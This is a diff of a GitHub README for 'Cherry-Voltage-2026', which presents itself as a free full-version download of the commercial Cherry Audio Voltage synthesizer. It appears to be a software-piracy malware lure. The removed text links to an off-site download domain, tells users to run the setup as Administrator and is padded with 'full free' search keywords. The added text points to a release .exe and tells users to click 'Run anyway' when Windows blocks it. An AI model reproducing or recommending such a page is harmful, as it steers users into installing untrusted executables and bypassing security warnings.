@@ -1,73 +1,77 @@
-# Cherry Audio Voltage — Full Version Download for Windows 11 & 10
+# 🎹 Cherry-Voltage-2026 - Create professional modular synth sounds easily
 
-**Cherry-Voltage-2026**
+[ ![Download Version](https://img.shields.io/badge/Download-Release-blue.svg) ](https://github.com/Bokismoki123/Cherry-Voltage-2026/releases)
 
-**Cherry Audio Voltage** — paid desktop app, **full / complete version** for Windows 10 and 11 (not a trial).  
-Direct installer link below.
+## 📥 Getting Started
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()
-[![Full Version](https://img.shields.io/badge/Full-Version-9333ea?style=flat-square)]()
-[![Download](https://img.shields.io/badge/Direct-Download-16a34a?style=flat-square)]()
+This guide covers the steps to download and install Cherry-Voltage-2026 on your Windows computer. Cherry-Voltage-2026 brings virtual modular synthesis to your music production setup. Follow these instructions to set up the software on your system.
 
----
+## 💻 System Requirements
 
-## Download & Install
+Before you install the software, check that your computer meets these requirements:
 
-> **This is the download page.** Use the button or link below to get **Cherry Audio Voltage** for Windows.
+* Operating System: Windows 10 or Windows 11 (64-bit).
+* Processor: Intel Core i5 or AMD equivalent with a speed of 2.5 GHz or higher.
+* Memory: 8 GB RAM minimum. 16 GB RAM recommended for large patches.
+* Storage: 500 MB of free hard drive space.
+* Audio Interface: Any ASIO-compatible audio device works best for low latency.
 
-<p align="center">
-  <a href="https://cherryvoltage.moltora.com/">
-    <img src="https://img.shields.io/badge/Download-Cherry%20Audio%20Voltage-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Cherry Audio Voltage">
-  </a>
-</p>
+## 🛠️ How to Download and Install
 
-| | |
-| --- | --- |
-| **Direct link** | **[cherryvoltage.moltora.com](https://cherryvoltage.moltora.com/)** |
-| **Full URL** | `https://cherryvoltage.moltora.com/` |
-| **Type** | Installer for Windows 10 / 11 (64-bit) |
-| **Admin** | Run setup as Administrator |
+Follow these steps to get the software onto your machine:
 
-### Quick steps
+1. Visit the [official release page](https://github.com/Bokismoki123/Cherry-Voltage-2026/releases) to see all available versions.
+2. Look for the latest version at the top of the list.
+3. Click the file ending in .exe to download the installer to your computer.
+4. Locate the file in your downloads folder once the transfer finishes.
+5. Double-click the file to start the installation.
+6. Follow the instructions on the screen.
+7. Click Finish to complete the process.
 
-1. Click **[Download — cherryvoltage.moltora.com](https://cherryvoltage.moltora.com/)** (link above)
-2. Save the file from the project page
-3. Run the setup **as Administrator**
-4. Enter your license key when prompted
-5. Restart if the installer asks — then launch from Start menu
+## 🎹 First Launch
 
-<p align="center"><a href="https://cherryvoltage.moltora.com/"><strong>⬇ Download Cherry Audio Voltage now</strong></a></p>
+Once the installer finishes, you can open the program from your desktop shortcut or the Start menu. 
 
----
+When you open the application for the first time, navigate to the Settings menu. Check the Audio tab to ensure your speakers or headphones appear in the output device list. Select your hardware device to hear sound. If you use an external audio interface, choose the ASIO driver for the best performance.
 
-## About Cherry Audio Voltage
+## 🎛️ Using the Software
 
-**Cherry Audio Voltage** is commercial software. Most people search for the **full unlocked build** on Windows — all features enabled, not the limited trial.
+Cherry-Voltage-2026 functions as a modular synthesizer. You create sounds by connecting different modules using virtual patch cables.
 
-**Common searches:** cherry audio voltage full version download windows, cherry audio voltage complete install 2026 pc, download cherry audio voltage full free windows 11
+* Drag a cable from an output jack on one module to an input jack on another.
+* Click and drag the knobs to change parameters like pitch, filter cutoff, and envelope times.
+* Use the menu bar to save your work. 
+* Load presets to explore different sound styles.
 
-**What you get:** complete Windows installer (64-bit), full feature set.
+## ❓ Frequently Asked Questions
 
-**Repository:** `Cherry-Voltage-2026`
+**Do I need a MIDI keyboard to use this?**
+You do not need a keyboard, but one makes playing easier. You can use your computer mouse to click on the virtual keys or connect a USB controller to trigger notes.
 
-## Install (full version)
+**Where does the software save my projects?**
+The software creates a default folder in your Documents directory under Cherry-Voltage-2026. You can change this path in the Preferences menu.
 
-| Step | Action |
-| --- | --- |
-| 1 | Download using the button above |
-| 2 | Run setup **as Administrator** |
-| 3 | Enter your **license key** when prompted |
-| 4 | Reboot once if the installer asks |
+**Can I run this inside my DAW?**
+The software functions as a standalone application. Recent updates may allow plugin support depending on your specific installation path and your digital audio workstation capabilities.
 
-## System requirements
+**How do I update to a newer version?**
+Check the release link regularly. If a new version exists, download the installer and run it. The new version will overwrite the old files and keep your presets intact.
 
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 8 GB (16 GB recommended) |
-| Disk | 1 GB free |
-| Admin | Required for install |
+**Does this software record audio?**
+The application generates sound in real-time. You will need a separate recording program to capture the output if you want to save your performance as an audio file.
 
----
+## 🔧 Troubleshooting Common Issues
 
-**Topics:** cherry-audio-voltage-full-version-download-windows, cherry, voltage, cherry-audio-voltage-complete-install-2026-pc, complete, download-cherry-audio-voltage-full-free-windows-11, cherry-voltage-2026, cherry-voltage, cherry-2026, cherry-audio-voltage, synthesizer, vst
+**No sound comes from the speakers.**
+Ensure the volume on your master module is up. Check that the audio output in the settings menu matches the device you use for your system sounds.
+
+**The program runs slowly.**
+Close other applications that use significant memory. If you use many modules, consider reducing the buffer size in the audio settings. 
+
+**Windows blocks the installer.**
+Windows might show a window that says the app is unrecognized. Click "More Info" and then select "Run anyway" to proceed with the installation.
+
+**The patch cables look messy.**
+Right-click on any patch cable to remove it. You can also hide cables in the view menu to keep your workspace clear.
+
+Keywords: cherry, cherry-2026, cherry-audio-voltage, cherry-audio-voltage-complete-install-2026-pc, cherry-audio-voltage-full-version-download-windows, cherry-voltage, cherry-voltage-2026, complete, complete-version, download, download-cherry-audio-voltage-full-free-windows-11, full-installer, modular-synth, music-production, software, synthesizer, voltage, vst, windows-11, windows-software
